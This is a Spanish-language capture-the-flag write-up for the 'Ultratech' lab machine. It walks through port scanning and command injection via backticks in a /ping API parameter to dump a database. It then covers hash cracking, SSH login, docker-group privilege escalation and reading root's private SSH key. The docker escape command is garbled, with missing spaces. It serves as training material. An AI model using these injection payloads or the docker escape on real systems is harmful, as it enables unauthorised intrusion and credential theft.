## 1. Introducción

### 1.1 Antecedentes

La máquina **Ultratech** es un laboratorio tipo CTF enfocado en explotación web y escalada de privilegios en sistemas Linux. En este reto se combinan técnicas de reconocimiento, análisis de aplicaciones web, explotación de vulnerabilidades en APIs y abuso de configuraciones inseguras del sistema para obtener acceso root.

### 1.2 Objetivos

- Identificar servicios expuestos en el sistema
- Enumerar la aplicación web y sus endpoints
- Explotar una vulnerabilidad de ejecución de comandos
- Escalar privilegios hasta root

---

## 2. Enumeración

### 2.1 Nmap

Se inicia con un escaneo completo de puertos:

```bash
nmap -sCV -p- $IP
```

Resultado relevante:

- **8081/tcp → Node.js (Express)**
- **31331/tcp → Apache (sitio web)**

Esto sugiere:

- Backend API en Node.js
- Frontend en Apache

### 2.2 Web

Al acceder a:

```
http://IP:31331
```

Se observa una página llamada:

> UltraTech - The best of technology
> 

Mediante inspección (y herramientas como Burp Suite), se identifican dos endpoints importantes:

```
http://IP:8081/ping?ip=
http://IP:8081/auth?login=&password=
```

Esto indica que la aplicación web interactúa con una API en el puerto 8081.

## 3. Explotación

### 3.1 Lectura de archivos

Se analiza el endpoint `/ping`.

Prueba inicial:

```
http://IP:8081/ping?ip=ls
```

Respuesta:

```
ping: ls: Temporary failure in name resolution
```

Esto indica que el input se está pasando a un comando del sistema.

Se prueba con ejecución de comandos usando backticks:

```
http://IP:8081/ping?ip=`ls`
```

Respuesta:

```
ping: utech.db.sqlite: Name or service not known
```

Se intenta leer la base de datos:

```
http://IP:8081/ping?ip=`cat utech.db.sqlite`
```

Se obtiene un hash:

```
f357a0***************
```

### 3.2 Crackeo del hash

Se usa hashcat:

```bash
hashcat hash /usr/share/wordlists/rockyou.txt
```

Resultado:

```
f357a0***************:n*******
```

### 3.3 Acceso por SSH

Con las credenciales obtenidas:

```
ssh r00t@IP
```

Se obtiene acceso al sistema.

---

## 4. Post-explotación

### 4.1 Escalada de privilegios

Una vez dentro, se procede a enumerar el sistema.

Se detecta que el usuario pertenece al grupo:

```
docker
```

Esto permite ejecutar contenedores con acceso al sistema host.

Se usa:

```bash
docker run-v /:/mnt--rm-itbashchroot /mntsh
```

Esto otorga acceso como **root**.

---

### 4.2 Obtención de evidencia

Se accede a:

```bash
cat /root/.ssh/id_rsa
```

Se obtiene la clave privada (flag):

```
MIIEogIBA...
```
